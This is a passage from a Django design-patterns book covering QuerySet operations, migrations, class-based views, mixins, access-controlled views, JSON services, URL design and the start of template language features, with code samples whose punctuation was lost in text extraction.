objects = PostManager    [ 549 ]  Chapter 3   By doing this, to access public_posts our code gets considerably simplified to the  following:  public = Post.objects.public_posts    Since the returned value is a QuerySet, they can be further filtered:  public_apology = Post.objects.public_posts  .filter                    message_startswith="Sorry"   QuerySets have several interesting properties. In the next few sections, we can take  a look at some common patterns that involve combining QuerySets. Set operations on QuerySets True to their name  or the latter half of their name , QuerySets support a lot of   mathematical  set operations. For the sake of illustration, consider two QuerySets  that contain the user objects:  >>> q1 = User.objects.filter username__in=["a", "b", "c"]   [ ,  ,  ]  >>> q2 = User.objects.filter username__in=["c", "d"]   [ ,  ]  Some set operations that you can perform on them are as follows:     Union: This combines and removes duplicates. Use q1  q2 to get [<User:   a>,  ,  ,  ] Intersection: This finds common items. Use q1 and q2 to get [ ]        Difference: This removes elements in second set from first. There is no   logical operator for this. Instead use q1.exclude pk__in=q2  to get [<User:  a>,  ]  The same operations can be done using the Q objects:  from django.db.models import Q   Union >>> User.objects.filter Q username__in=["a", "b", "c"]   Q username__ in=["c", "d"]   [ ,  ,  ,  ]   Intersection >>> User.objects.filter Q username__in=["a", "b", "c"]  & Q username__ in=["c", "d"]   [ ]  [ 550 ]  Models    Difference >>> User.objects.filter Q username__in=["a", "b", "c"]  &  ~Q username__in=["c", "d"]   [ ,  ]  Note that the difference is implemented using &  AND  and ~  Negation .   The Q objects are very powerful and can be used to build very complex queries.  However, the Set analogy is not perfect. QuerySets, unlike mathematical sets,   are ordered. So, they are closer to Python's list data structure in that respect. Chaining multiple QuerySets So far, we have been combining QuerySets of the same type belonging to the same  base class. However, we might need to combine QuerySets from different models  and perform operations on them.  For example, a user's activity timeline contains all their posts and comments in  reverse chronological order. The previous methods of combining QuerySets won't  work. A naïve solution would be to convert them to lists, concatenate, and sort them,  like this:  >>>recent = list posts +list comments   >>>sorted recent, key=lambda e: e.modified, reverse=True [:3]  [ ,  ,  ]   Unfortunately, this operation has evaluated the lazy QuerySets object. The  combined memory usage of the two lists can be overwhelming. Besides, it can be  quite slow to convert large QuerySets into lists.  A much better solution uses iterators to reduce the memory consumption. Use the  itertools.chain method to combine multiple QuerySets as follows:  >>> from itertools import chain  >>> recent = chain posts, comments   >>> sorted recent, key=lambda e: e.modified, reverse=True [:3]  Once you evaluate a QuerySet, the cost of hitting the database can be quite high.   So, it is important to delay it as long as possible by performing only operations that  will return QuerySets unevaluated.  Keep QuerySets unevaluated as long as possible.  [ 551 ]  Chapter 3   Migrations Migrations help you to confidently make changes to your models. Introduced in  Django 1.7, migrations are an essential and easy-to-use parts of a development  workflow.  The new workflow is essentially as follows:  1.  The first time you define your model classes, you will need to run:  python manage.py makemigrations    2.  This will create migration scripts in app migrations folder. 3.  Run the following command in the same  development  environment:  python manage.py migrate    This will apply the model changes to the database. Sometimes, questions   are asked to handle the default values, renaming, and so on.  4.  Propagate the migration scripts to other environments. Typically, your  version control tool, for example Git, will take care of this. As the latest  source is checked out, the new migration scripts will also appear. 5.  Run the following command in these environments to apply the    model changes: python manage.py migrate    6.  Whenever you make changes to the models classes, repeat steps 1-5.  If you omit the app label in the commands, Django will find unapplied changes   in every app and migrate them.  Summary Model design is hard to get it right. Yet, it is fundamental to Django development.   In this chapter, we looked at several common patterns when working with models.  In each case, we looked at the impact of the proposed solution and various tradeoffs.  In the next chapter, we will examine the common design patterns we encounter  when working with views and URL configurations.  [ 552 ]  Models   Views and URLs  In this chapter, we will discuss the following topics:     Class-based and function-based views    Mixins    Decorators    Common view patterns    Designing URLs  A view from the top In Django, a view is defined as a callable that accepts a request and returns a  response. It is usually a function or a class with a special class method such as   as_view  .  In both cases, we create a normal Python function that takes an HTTPRequest as the  first argument and returns an HTTPResponse. A URLConf can also pass additional  arguments to this function. These arguments can be captured from parts of the URL  or set to default values.  Here is what a simple view looks like:   In views.py from django.http import HttpResponse  def hello_fn request, name="World" :     return HttpResponse "Hello {}!".format name    [ 553 ]   Our two-line view function is quite simple to understand. We are currently not  doing anything with the request argument. We can examine a request to better  understand the context in which the view was called, for example by looking at   the GET POST parameters, URI path, or HTTP headers such as REMOTE_ADDR.  Its corresponding lines in URLConf would be as follows:   In urls.py     url r'^hello-fn  ?P \w+  $', views.hello_fn ,     url r'^hello-fn $', views.hello_fn ,  We are reusing the same view function to support two URL patterns. The first   pattern takes a name argument. The second pattern doesn't take any argument from  the URL, and the view function will use the default name of World in this case.  Views got classier Class-based views were introduced in Django 1.4. Here is how the previous view  looks when rewritten to be a functionally equivalent class-based view:  from django.views.generic import View class HelloView View :     def get self, request, name="World" :         return HttpResponse "Hello {}!".format name    Again, the corresponding URLConf would have two lines, as shown in the   following commands:   In urls.py     url r'^hello-cl  ?P \w+  $', views.HelloView.as_view   ,     url r'^hello-cl $', views.HelloView.as_view   ,  There are several interesting differences between this view class and our earlier  view function. The most obvious one being that we need to define a class. Next,  we explicitly define that we will handle only the GET requests. The previous view  function gives the same response for GET, POST, or any other HTTP verb, as shown   in the following commands using the test client in Django shell:  >>> from django.test import Client  >>> c = Client    >>> c.get "http:  0.0.0.0:8000 hello-fn " .content  [ 554 ]  Views and URLs   b'Hello World!'  b'Hello World!'  b'Hello World!'  b''  >>> c.post "http:  0.0.0.0:8000 hello-fn " .content  >>> c.get "http:  0.0.0.0:8000 hello-cl " .content  >>> c.post "http:  0.0.0.0:8000 hello-cl " .content  Being explicit is good from a security and maintainability point of view.  The advantage of using a class will be clear when you need to customize your view.  Say you need to change the greeting and the default name. Then, you can write a  general view class for any kind of greeting and derive your specific greeting classes  as follows:  class GreetView View :     greeting = "Hello {}!"     default_name = "World"     def get self, request, **kwargs :         name = kwargs.pop "name", self.default_name          return HttpResponse self.greeting.format name    class SuperVillainView GreetView :     greeting = "We are the future, {}. Not them. "     default_name = "my friend"  Now, the URLConf would refer to the derived class:   In urls.py     url r'^hello-su  ?P \w+  $', views.SuperVillainView.as_ view   ,     url r'^hello-su $', views.SuperVillainView.as_view   ,  While it is not impossible to customize the view function in a similar manner, you  would need to add several keyword arguments with default values. This can quickly  get unmanageable. This is exactly why generic views migrated from view functions  to class-based views.  [ 555 ]  Chapter 4   Django Unchained After spending 2 weeks hunting for good Django developers, Steve  started to think out of the box. Noticing the tremendous success of  their recent hackathon, he and Hart organized a Django Unchained  contest at S.H.I.M. The rules were simple—build one web application  a day. It could be a simple one but you cannot skip a day or break the  chain. Whoever creates the longest chain, wins. The winner—Brad Zanni was a real surprise. Being a traditional  designer with hardly any programming background, he had once  attended week-long Django training just for kicks. He managed to  create an unbroken chain of 21 Django sites, mostly from scratch. The very next day, Steve scheduled a 10 o' clock meeting with him  at his office. Though Brad didn't know it, it was going to be his  recruitment interview. At the scheduled time, there was a soft knock  and a lean bearded guy in his late twenties stepped in. As they talked, Brad made no pretense of the fact that he was not  a programmer. In fact, there was no pretense to him at all. Peering  through his thick-rimmed glasses with calm blue eyes, he explained  that his secret was quite simple—get inspired and then focus. He used to start each day with a simple wireframe. He would then  create an empty Django project with a Twitter bootstrap template. He  found Django's generic class-based views a great way to create views  with hardly any code. Sometimes, he would use a mixin or two from  Django-braces. He also loved the admin interface for adding data on  the go. His favorite project was Labyrinth—a Honeypot disguised as a  baseball forum. He even managed to trap a few surveillance bots  hunting for vulnerable sites. When Steve explained about the  SuperBook project, he was more than happy to accept the offer. The  idea of creating an interstellar social network truly fascinated him. With a little more digging around, Steve was able to find half a dozen  more interesting profiles like Brad within S.H.I.M. He learnt that rather  that looking outside he should have searched within the organization  in the first place.  Class-based generic views Class-based generic views are commonly used views implemented in an   object-oriented manner  Template method pattern  for better reuse. I hate the   term generic views. I would rather call them stock views. Like stock photographs,   you can use them for many common needs with a bit of tweaking.  [ 556 ]  Views and URLs   Generic views were created because Django developers felt that they were recreating  the same kind of views in every project. Nearly every project needed a page showing  a list of objects  ListView , details of an object  DetailView , or a form to create   an object  CreateView . In the spirit of DRY, these reusable views were bundled   with Django.  A convenient table of generic views in Django 1.7 is given here:  Type Base  Base  Base List Detail  Edit Edit  Edit  Edit Date  Date Date Date  Date Date Date  Class Name View  TemplateView  RedirectView ListView DetailView  FormView CreateView  UpdateView  DeleteView ArchiveIndexView  YearArchiveView MonthArchiveView WeekArchiveView  DayArchiveView TodayArchiveView DateDetailView  Description This is the parent of all views. It performs dispatch and  sanity checks. This renders a template. It exposes the URLConf  keywords into context. This redirects on any GET request. This renders any iterable of items, such as a queryset. This renders an item based on pk or slug from  URLConf. This renders and processes a form. This renders and processes a form for creating new  objects. This renders and processes a form for updating an  object. This renders and processes a form for deleting an object. This renders a list of objects with a date field, the latest  being the first. This renders a list of objects on year given by URLConf. This renders a list of objects on a year and month. This renders a list of objects on a year and week  number. This renders a list of objects on a year, month, and day. This renders a list of objects on today's date. This renders an object on a year, month, and day  identified by its pk or slug.  We have not mentioned base classes such as BaseDetailView or mixins such as  SingleObjectMixin here. They are designed to be parent classes. In most cases,   you would not use them directly.  [ 557 ]  Chapter 4   Most people confuse class-based views and class-based generic views. Their names  are similar but they are not the same things. This has led to some interesting  misconceptions as follows:     The only generic views are the ones bundled with Django: Thankfully,   this is wrong. There is no special magic in the generic class-based views   that are provided. You are free to roll your own set of generic class-based views. You   can also use a third-party library such as django-vanilla-views    http:  django-vanilla-views.org  , which has a simpler  implementation of the standard generic views. Remember that using  custom generic views might make your code unfamiliar to others.     Class-based views must always derive from a generic view: Again, there  is nothing magical about the generic view classes. Though 90 percent of the  time, you will find a generic class such as View to be ideal for use as a base  class, you are free to implement similar features yourself.  View mixins Mixins are the essence of DRY code in class-based views. Like model mixins, a   view mixin takes advantage of Python's multiple inheritance to easily reuse chunks  of functionality. They are often parent-less classes in Python 3  or derived from  object in Python 2 since they are new-style classes .  Mixins intercept the processing of views at well-defined places. For example,   most generic views use get_context_data to set the context dictionary. It is a   good place to insert an additional context, such as a feed variable that points   to all posts a user can view, as shown in the following command:  class FeedMixin object :     def get_context_data self, **kwargs :         context = super  .get_context_data **kwargs          context["feed"] = models.Post.objects.viewable_posts self. request.user          return context  The get_context_data method first populates the context by calling its namesake in  all the bases classes. Next, it updates the context dictionary with the feed variable.  [ 558 ]  Views and URLs   Now, this mixin can be easily used to add the user's feed by including it in the list of  base classes. Say, if SuperBook needs a typical social network home page with a form  to create a new post followed by your feed, then you can use this mixin as follows:  class MyFeed FeedMixin, generic.CreateView :     model = models.Post     template_name = "myfeed.html"     success_url = reverse_lazy "my_feed"   A well-written mixin imposes very little requirements. It should be flexible to be  useful in most situations. In the previous example, FeedMixin will overwrite the  feed context variable in a derived class. If a parent class uses feed as a context  variable, then it can be affected by the inclusion of this mixin. Hence, it would be  more useful to make the context variable customizable  which has been left to you   as an exercise .  The ability of mixins to combine with other classes is both their biggest advantage  and disadvantage. Using the wrong combination can lead to bizarre results. So,  before using a mixin, you need to check the source code of the mixin and other  classes to ensure that there are no method or context-variable clashes.  Order of mixins You might have come across code with several mixins as follows:  class ComplexView MyMixin, YourMixin, AccessMixin, DetailView :  It can get quite tricky to figure out the order to list the base classes. Like most things  in Django, the normal rules of Python apply. Python's Method Resolution Order   MRO  determines how they should be arranged. In a nutshell, mixins come first and base classes come last. The more specialized the  parent class is, the more it moves to the left. In practice, this is the only rule you will  need to remember.  To understand why this works, consider the following simple example:  class A:     def do self :         print "A"   class B:  [ 559 ]  Chapter 4       def do self :         print "B"   class BA B, A :     pass  class AB A, B :     pass  BA  .do    Prints B AB  .do    Prints A  As you would expect, if B is mentioned before A in the list of base classes, then B's  method gets called and vice versa.   Now imagine A is a base class such as CreateView and B is a mixin such as  FeedMixin. The mixin is an enhancement over the basic functionality of the   base class. Hence, the mixin code should act first and in turn, call the base   method if needed. So, the correct order is BA  mixins first, base last .  The order in which base classes are called can be determined by checking   the __mro__ attribute of the class:  >>> AB.__mro__    __main__.AB, __main__.A, __main__.B, object   So, if AB calls super  , first A gets called; then, A's super   will call B, and so on.  Python's MRO usually follows a depth-first, left-to-right order to  select a method in the class hierarchy. More details can be found at  http:  www.python.org download releases 2.3 mro .  Decorators Before class-based views, decorators were the only way to change the behavior of  function-based views. Being wrappers around a function, they cannot change the  inner working of the view, and thus effectively treat them as black boxes.  A decorator is function that takes a function and returns the decorated function.  Confused? There is some syntactic sugar to help you. Use the annotation notation   @, as shown in the following login_required decorator example:  @login_required  [ 560 ]  Views and URLs   def simple_view request :     return HttpResponse    The following code is exactly same as above:  def simple_view request :     return HttpResponse    simple_view = login_required simple_view   Since login_required wraps around the view, a wrapper function gets the control  first. If the user was not logged in, then it redirects to settings.LOGIN_URL.  Otherwise, it executes simple_view as if it did not exist.  Decorators are less flexible than mixins. However, they are simpler. You can   use both decorators and mixins in Django. In fact, many mixins are implemented  with decorators.  View patterns Let's take a look at some common design patterns seen in designing views.  Pattern – access controlled views Problem: Pages need to be conditionally accessible based on whether the user was  logged in, is a member of staff, or any other condition. Solution: Use mixins or decorators to control access to the view.  Problem details Most websites have pages that can be accessed only if you are logged in. Certain  other pages are accessible to anonymous or public visitors. If an anonymous visitor  tries to access a page, which needs a logged-in user, they could be routed to the login  page. Ideally, after logging in, they should be routed back to the page they wished   to see in the first place.  Similarly, there are pages that can only be seen by certain groups of users. For  example, Django's admin interface is only accessible to the staff. If a non-staff user  tries to access the admin pages, they would be routed to the login page.  Finally, there are pages that grant access only if certain conditions are met. For  example, the ability to edit a post should be only accessible to the creator of the   post. Anyone else accessing this page should see a Permission Denied error.  [ 561 ]  Chapter 4   Solution details There are two ways to control access to a view:  1.  By using a decorator on a function-based view or class-based view:  @login_required MyView.as_view     2.  By overriding the dispatch method of a class-based view through a mixin:  from django.utils.decorators import method_decorator  class LoginRequiredMixin:     @method_decorator login_required      def dispatch self, request, *args, **kwargs :         return super  .dispatch request, *args, **kwargs   We really don't need the decorator here. The more explicit form  recommended is as follows:  class LoginRequiredMixin:      def dispatch self, request, *args, **kwargs :         if not request.user.is_authenticated  :             raise PermissionDenied         return super  .dispatch request, *args, **kwargs   When the PermissionDenied exception is raised, Django shows the 403.html  template in your root directory or, in its absence, a standard "403 Forbidden" page.  Of course, you would need a more robust and customizable set of mixins for real  projects. The django-braces package  https:  github.com brack3t django- braces  has an excellent set of mixins, especially for controlling access to views.  Here are examples of using them to control access to the logged-in and anonymous  views:  from braces.views import LoginRequiredMixin, AnonymousRequiredMixin  class UserProfileView LoginRequiredMixin, DetailView :      This view will be seen only if you are logged-in     pass    class LoginFormView AnonymousRequiredMixin, FormView :      This view will NOT be seen if you are loggedin     authenticated_redirect_url = " feed"  [ 562 ]  Views and URLs   Staff members in Django are users with the is_staff flag set in the user model.  Again, you can use a django-braces mixin called UserPassesTestMixin, as follows:  from braces.views import UserPassesTestMixin  class SomeStaffView UserPassesTestMixin, TemplateView :     def test_func self, user :         return user.is_staff  You can also create mixins to perform specific checks, such as if the object is being  edited by its author or not  by comparing it with the logged-in user :  class CheckOwnerMixin:       To be used with classes derived from SingleObjectMixin     def get_object self, queryset=None :         obj = super  .get_object queryset          if not obj.owner == self.request.user:             raise PermissionDenied         return obj  Pattern – context enhancers Problem: Several views based on generic views need the same context variable. Solution: Create a mixin that sets the shared context variable.  Problem details Django templates can only show variables that are present in its context dictionary.  However, sites need the same information in several pages. For instance, a sidebar  showing the recent posts in your feed might be needed in several views.  However, if we use a generic class-based view, we would typically have a limited   set of context variables related to a specific model. Setting the same context variable  in each view is not DRY.  Solution details Most generic class-based views are derived from ContextMixin. It provides   the get_context_data method, which most classes override, to add their own   context variables. While overriding this method, as a best practice, you will need   to call get_context_data of the superclass first and then add or override your   context variables.  [ 563 ]  Chapter 4   We can abstract this in the form of a mixin, as we have seen before:  class FeedMixin object :      def get_context_data self, **kwargs :         context = super  .get_context_data **kwargs          context["feed"] = models.Post.objects.viewable_posts self. request.user          return context  We can add this mixin to our views and use the added context variables in our  templates. Notice that we are using the model manager defined in Chapter 3,   Models, to filter the posts. A more general solution is to use StaticContextMixin from django-braces for  static-context variables. For example, we can add an additional context variable  latest_profile that contains the latest user to join the site:  class CtxView StaticContextMixin, generic.TemplateView :     template_name = "ctx.html"     static_context = {"latest_profile": Profile.objects.latest 'pk' }  Here, static context means anything that is unchanged from a request to request. In  that sense, you can mention QuerySets as well. However, our feed context variable  needs self.request.user to retrieve the user's viewable posts. Hence, it cannot be  included as a static context here.  Pattern – services Problem: Information from your website is often scraped and processed by   other applications. Solution: Create lightweight services that return data in machine-friendly formats,  such as JSON or XML.  Problem details We often forget that websites are not just used by humans. A significant   percentage of web traffic comes from other programs like crawlers, bots, or   scrapers. Sometimes, you will need to write such programs yourself to extract  information from another website.  Generally, pages designed for human consumption are cumbersome for mechanical  extraction. HTML pages have information surrounded by markup, requiring  extensive cleanup. Sometimes, information will be scattered, needing extensive   data collation and transformation.  [ 564 ]  Views and URLs   A machine interface would be ideal in such situations. You can not only reduce   the hassle of extracting information but also enable the creation of mashups.   The longevity of an application would be greatly increased if its functionality is  exposed in a machine-friendly manner.  Solution details Service-oriented architecture  SOA  has popularized the concept of a service. A  service is a distinct piece of functionality exposed to other applications as a service.  For example, Twitter provides a service that returns the most recent public statuses.  A service has to follow certain basic principles:     Statelessness: This avoids the internal state by externalizing state   information     Loosely coupled: This has fewer dependencies and a minimum of assumptions    Composable: This should be easy to reuse and combine with other services In Django, you can create a basic service without any third-party packages. Instead  of returning HTML, you can return the serialized data in the JSON format. This form  of a service is usually called a web Application Programming Interface  API . For example, we can create a simple service that returns five recent public posts   from SuperBook as follows:  class PublicPostJSONView generic.View :      def get self, request, *args, **kwargs :         msgs = models.Post.objects.public_posts  .values              "posted_by_id", "message" [:5]         return HttpResponse list msgs , content_type="application  json"   For a more reusable implementation, you can use the JSONResponseMixin class   from django-braces to return JSON using its render_json_response method:  from braces.views import JSONResponseMixin  class PublicPostJSONView JSONResponseMixin, generic.View :      def get self, request, *args, **kwargs :         msgs = models.Post.objects.public_posts  .values   [ 565 ]  Chapter 4               "posted_by_id", "message" [:5]         return self.render_json_response list msgs    If we try to retrieve this view, we will get a JSON string rather than an HTML  response:  >>> from django.test import Client  >>> Client  .get "http:  0.0.0.0:8000 public " .content  b'[{"posted_by_id": 23, "message": "Hello!"},     {"posted_by_id": 13, "message": "Feeling happy"},     ...  Note that we cannot pass the QuerySet method directly to render the JSON  response. It has to be a list, dictionary, or any other basic Python built-in data   type recognized by the JSON serializer.  Of course, you will need to use a package such as Django REST framework if you  need to build anything more complex than this simple API. Django REST framework  takes care of serializing  and deserializing  QuerySets, authentication, generating   a web-browsable API, and many other features essential to create a robust and   full-fledged API.  Designing URLs Django has one of the most flexible URL schemes among web frameworks.   Basically, there is no implied URL scheme. You can explicitly define any URL   scheme you like using appropriate regular expressions.  However, as superheroes love to say—"With great power comes great  responsibility." You cannot get away with a sloppy URL design any more.  URLs used to be ugly because they were considered to be ignored by users. Back  in the 90s when portals used to be popular, the common assumption was that your  users will come through the front door, that is, the home page. They will navigate   to the other pages of the site by clicking on links.  Search engines have changed all that. According to a 2013 research report, nearly   half  47 percent  of all visits originate from a search engine. This means that any   page in your website, depending on the search relevance and popularity can be   the first page your user sees. Any URL can be the front door.  More importantly, Browsing 101 taught us security. Don't click on a blue link in   the wild, we warn beginners. Read the URL first. Is it really your bank's URL or   a site trying to phish your login details?  [ 566 ]  Views and URLs   Today, URLs have become part of the user interface. They are seen, copied, shared,  and even edited. Make them look good and understandable from a glance. No more  eye sores such as:  http:  example.com gallery default.asp?sid=9DF4BC0280DF12D3ACB6009027 1E26A8&command=commntform  Short and meaningful URLs are not only appreciated by users but also by search  engines. URLs that are long and have less relevance to the content adversely affect  your site's search engine rankings.  Finally, as implied by the maxim "Cool URIs don't change," you should try to maintain  your URL structure over time. Even if your website is completely redesigned, your old  links should still work. Django makes it easy to ensure that this is so.  Before we delve into the details of designing URLs, we need to understand the  structure of a URL.  URL anatomy Technically, URLs belong to a more general family of identifiers called Uniform  Resource Identifiers  URIs . Hence, a URL has the same structure as a URI. A URI is composed of several parts:  URI = Scheme + Net Location + Path + Query + Fragment  For example, a URI  http:  dev.example.com:80 gallery  videos?id=217comments  can be deconstructed in Python using the urlparse  function:  >>> from urllib.parse import urlparse  >>> urlparse "http:  dev.example.com:80 gallery videos?id=217comments"   ParseResult scheme='http', netloc='dev.example.com:80', path=' gallery  videos', params='', query='id=217', fragment='comments'   The URI parts can be depicted graphically as follows:  [ 567 ]  Chapter 4   Even though Django documentation prefers to use the term URLs, it might more  technically correct to say that you are working with URIs most of the time. We   will use the terms interchangeably in this book.  Django URL patterns are mostly concerned about the 'Path' part of the URI. All   other parts are tucked away.  What happens in urls.py? It is often helpful to consider urls.py as the entry point of your project. It is usually  the first file I open when I study a Django project. Essentially, urls.py contains the  root URL configuration or URLConf of the entire project.  It would be a Python list returned from patterns assigned to a global variable   called urlpatterns. Each incoming URL is matched with each pattern from top   to bottom in a sequence. In the first match, the search stops, and the request is sent   to the corresponding view.  Here, in considerably simplified form, is an excerpt of urls.py from Python.org,  which was recently rewritten in Django:  urlpatterns = patterns      '',      Homepage     url r'^$', views.IndexView.as_view  , name='home' ,      About     url r'^about $',         TemplateView.as_view template_name="python about.html" ,         name='about' ,      Blog URLs     url r'^blogs ', include 'blogs.urls', namespace='blog'  ,      Job archive     url r'^jobs  ?P \d+  $',         views.JobArchive.as_view  ,         name='job_archive' ,      Admin     url r'^admin ', include admin.site.urls  ,    [ 568 ]  Views and URLs   Some interesting things to note here are as follows:     The first argument of the patterns function is the prefix. It is usually blank   for the root URLConf. The remaining arguments are all URL patterns.    Each URL pattern is created using the url function, which takes five   arguments. Most patterns have three arguments: the regular expression  pattern, view callable, and name of the view.     The about pattern defines the view by directly instantiating TemplateView.  Some hate this style since it mentions the implementation, thereby violating  separation of concerns.     Blog URLs are mentioned elsewhere, specifically in urls.py inside the   blogs app. In general, separating an app's URL pattern into its own file   is good practice.     The jobs pattern is the only example here of a named regular expression.  In future versions of Django, urlpatterns should be a plain list of URL pattern  objects rather than arguments to the patterns function. This is great for sites with  lots of patterns, since urlpatterns being a function can accept only a maximum of  255 arguments.  If you are new to Python regular expressions, you might find the pattern syntax to   be slightly cryptic. Let's try to demystify it.  The URL pattern syntax URL regular expression patterns can sometimes look like a confusing mass of  punctuation marks. However, like most things in Django, it is just regular Python.  It can be easily understood by knowing that URL patterns serve two functions: to  match URLs appearing in a certain form, and to extract the interesting bits from a  URL.  The first part is easy. If you need to match a path such as  jobs 1234, then just use  the "^jobs \d+" pattern  here \d stands for a single digit from 0 to 9 . Ignore the  leading slash, as it gets eaten up.  The second part is interesting because, in our example, there are two ways of  extracting the job ID  that is, 1234 , which is required by the view.  [ 569 ]  Chapter 4   The simplest way is to put a parenthesis around every group of values to be  captured. Each of the values will be passed as a positional argument to the view.  For example, the "^jobs  \d+ " pattern will send the value "1234" as the second  argument  the first being the request  to the view.  The problem with positional arguments is that it is very easy to mix up the order.  Hence, we have name-based arguments, where each captured value can be named.  Our example will now look like "^jobs  ?P \d+  " . This means that the view  will be called with a keyword argument pk being equal to "1234".  If you have a class-based view, you can access your positional arguments in self. args and name-based arguments in self.kwargs. Many generic views expect their  arguments solely as name-based arguments, for example, self.kwargs["slug"]. Mnemonic – parents question pink action-figures I admit that the syntax for name-based arguments is quite difficult to remember.  Often, I use a simple mnemonic as a memory aid. The phrase "Parents Question   Pink Action-figures" stands for the first letters of Parenthesis, Question mark,    the letter  P, and Angle brackets.  Put them together and you get  ?P< . You can enter the name of the pattern and  figure out the rest yourself.  It is a handy trick and really easy to remember. Just imagine a furious parent   holding a pink-colored hulk action figure.  Another tip is to use an online regular expression generator such as http:  pythex. org  or https:  www.debuggex.com  to craft and test your regular expressions.  Names and namespaces Always name your patterns. It helps in decoupling your code from the exact  URL paths. For instance, in the previous URLConf, if you want to redirect to the  about page, it might be tempting to use redirect " about" . Instead, use  redirect "about" , as it uses the name rather than the path.  Here are some more examples of reverse lookups:  >>> from django.core.urlresolvers import reverse  >>> print reverse "home"    " "  "jobs 1234 "  >>> print reverse "job_archive", kwargs={"pk":"1234"}    [ 570 ]  Views and URLs   Names must be unique. If two patterns have the same name, they will not work. So,  some Django packages used to add prefixes to the pattern name. For example, an  application named blog might have to call its edit view as 'blog-edit' since 'edit'   is a common name and might cause conflict with another application.  Namespaces were created to solve such problems. Pattern names used in a  namespace have to be only unique within that namespace and not the entire project.  It is recommended that you give every app its own namespace. For example, we   can create a 'blog' namespace with only the blog's URLs by including this line in   the root URLconf:  url r'^blog ', include 'blog.urls', namespace='blog'  ,  Now the blog app can use pattern names, such as 'edit' or anything else as long as  they are unique within that app. While referring to a name within a namespace, you  will need to mention the namespace, followed by a ':' before the name. It would be  "blog:edit" in our example.  As Zen of Python says—"Namespaces are one honking great idea—let's do more of  those." You can create nested namespaces if it makes your pattern names cleaner,  such as "blog:comment:edit". I highly recommend that you use namespaces in  your projects.  Pattern order Order your patterns to take advantage of how Django processes them, that is,   top-down. A good rule of thumb is to keep all the special cases at the top. Broader  patterns can be mentioned further down. The broadest—a catch-all—if present,   can go at the very end.  For example, the path to your blog posts might be any valid set of characters, but  you might want to handle the About page separately. The right sequence of patterns  should be as follows:  urlpatterns = patterns      '',     url r'^about $', AboutView.as_view  , name='about' ,     url r'^ ?P \w+  $', ArticleView.as_view  , name='article' ,      If we reverse the order, then the special case, the AboutView, will never get called.  [ 571 ]  Chapter 4   URL pattern styles Designing URLs of a site consistently can be easily overlooked. Well-designed   URLs can not only logically organize your site but also make it easy for users to  guess paths. Poorly designed ones can even be a security risk: say, using a database  ID  which occurs in a monotonic increasing sequence of integers  in a URL pattern   can increase the risk of information theft or site ripping.  Let's examine some common styles followed in designing URLs. Departmental store URLs Some sites are laid out like Departmental stores. There is a section for Food, inside  which there would be an aisle for Fruits, within which a section with different  varieties of Apples would be arranged together.  In the case of URLs, this means that you will find these pages arranged hierarchically  as follows:  http:  site.com             The beauty of this layout is that it is so easy to climb up to the parent section.   Once you remove the tail end after the slash, you are one level up.  For example, you can create a similar structure for the articles section, as shown here:   project's main urls.py urlpatterns = patterns      '',     url r'^articles $', include articles.urls , namespace="articles" ,     articles urls.py urlpatterns = patterns      '',     url r'^$', ArticlesIndex.as_view  , name='index' ,     url r'^ ?P \w+  $', ArticleView.as_view  , name='article' ,    Notice the 'index' pattern that will show an article index in case a user climbs up  from a particular article.  [ 572 ]  Views and URLs   RESTful URLs In 2000, Roy Fielding introduced the term Representational state transfer  REST  in  his doctoral dissertation. Reading his thesis  http:  www.ics.uci.edu ~fielding  pubs dissertation top.htm  is highly recommended to better understand the  architecture of the web itself. It can help you write better web applications that do  not violate the core constraints of the architecture.  One of the key insights is that a URI is an identifier to a resource. A resource can  be anything, such as an article, a user, or a collection of resources, such as events.  Generally speaking, resources are nouns.  The web provides you with some fundamental HTTP verbs to manipulate resources:  GET, POST, PUT, PATCH, and DELETE. Note that these are not part of the URL itself.  Hence, if you use a verb in the URL to manipulate a resource, it is a bad practice.  For example, the following URL is considered bad:  http:  site.com articles submit   Instead, you should remove the verb and use the POST action to this URL:  http:  site.com articles   Best Practice Keep verbs out of your URLs if HTTP verbs can be used instead.  Note that it is not wrong to use verbs in a URL. The search URL for your site can  have the verb 'search' as follows, since it is not associated with one resource as   per REST:  http:  site.com search ?q=needle  RESTful URLs are very useful for designing CRUD interfaces. There is almost a   one-to-one mapping between the Create, Read, Update, and Delete database  operations and the HTTP verbs.  Note that the RESTful URL style is complimentary to the departmental store URL  style. Most sites mix both the styles. They are separated for clarity and better  understanding.

Summary Views are an extremely powerful part of the MVC architecture in Django. Over  time, class-based views have proven to be more flexible and reusable compared to  traditional function-based views. Mixins are the best examples of this reusability.  Django has an extremely flexible URL dispatch system. Crafting good URLs takes  into account several aspects. Well-designed URLs are appreciated by users too.  In the next chapter, we will take a look at Django's templating language and how  best to leverage it.  [ 574 ]  Views and URLs   Templates  In this chapter, we will discuss the following topics:     Features of Django's template language    Organizing templates    Bootstrap    Template inheritance tree pattern    Active link pattern  Understanding Django's template  language features It is time to talk about the third musketeer in the MTV trio—templates. Your   team might have designers who take care of designing templates. Or you might   be designing them yourself. Either way, you need to be very familiar with them.  They are, after all, directly facing your users.  Let's start with a quick primer of Django's template language features.  Variables Each template gets a set of context variables. Similar to Python's string format    method's single curly brace {variable} syntax, Django uses the double curly brace  {{ variable }} syntax. Let's see how they compare:      In Pure Python the syntax is  {title} . For example: >>> " {title} ".format title="SuperBook"   ' SuperBook '  [ 575 ]      The syntax equivalent in a Django template is  {{ title }} .    Rendering with the same context will produce the same output as follows:  >>> from django.template import Template, Context  >>> Template " {{ title }} " .render Context {"title":  "SuperBook"}    ' SuperBook '  Attributes Dot is a multipurpose operator in Django templates. There are three different   kinds of operations—attribute lookup, dictionary lookup, or list-index lookup    in that order .      In Python, first, let's define the context variables and classes: >>> class DrOct:          arms = 4          def speak self :  >>> mydict = {"key":"value"}  >>> mylist = [10, 20, 30]              return "You have a train to catch."  Let's take a look at Python's syntax for the three kinds of lookups:  >>> "Dr. Oct has {0} arms and says: {1}".format DrOct  .arms,  DrOct  .speak     'Dr. Oct has 4 arms and says: You have a train to catch.'  >>> mydict["key"]   'value'  >>> mylist[1]   20  {{ mydict.key }}  {{ mylist.1 }}      In Django's template equivalent, it is as follows:  Dr. Oct has {{ s.arms }} arms and says: {{ s.speak }}  [ 576 ]  Templates   Notice how speak, a method that takes no arguments except  self, is treated like an attribute here.  Filters Sometimes, variables need to be modified. Essentially, you would like to call functions  on these variables. Instead of chaining function calls, such as var.method1  . method2 arg , Django uses the pipe syntax {{ varmethod1method2:"arg" }},  which is similar to Unix filters. However, this syntax only works for built-in or   custom-defined filters.  Another limitation is that filters cannot access the template context. It only works  with the data passed into it and its arguments. Hence, it is primarily used to alter   the variables in the template context.     Run the following command in Python:  >>> title="SuperBook"  >>> title.upper  [:5]   